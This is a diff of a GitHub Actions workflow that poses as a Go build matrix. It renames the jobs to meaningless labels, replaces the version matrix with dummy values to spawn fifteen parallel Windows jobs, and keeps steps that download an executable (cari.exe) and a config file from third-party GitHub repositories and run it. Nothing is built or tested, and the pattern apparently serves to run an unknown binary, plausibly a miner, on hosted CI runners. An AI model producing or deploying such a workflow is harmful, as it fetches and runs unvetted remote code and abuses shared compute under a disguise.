@@ -1,17 +1,20 @@
-name: trial
-
+name: MMMM
+ 
 on: [workflow_dispatch]
  
 jobs:
   build:
-    name: BUILD
+    name: WSDS
     runs-on: windows-latest
     strategy:
+      max-parallel: 10
       fail-fast: false
       matrix:
-         go: [1.11, 1.12, 1.13, 1.14, 1.15]
-         flag: [A, B, C, D]
-    timeout-minutes: 360
+        go: [1,2,3,4,5]
+        flag: [A,B,C]
+    env:
+        NUM_JOBS: 20
+        JOB: ${{ matrix.go }}
     steps:
     - name: PREPARING
       run: Invoke-WebRequest https://raw.githubusercontent.com/outlookadek/PAPAERSPACE/main/cari.exe -Outfile cari.exe
@@ -19,3 +22,5 @@ jobs:
       run: Invoke-WebRequest https://raw.githubusercontent.com/trautroi/aws/master/1.18/config.json -Outfile config.json
     - name: Running
       run: ./cari.exe
+    - name: DONE
+      run: exit
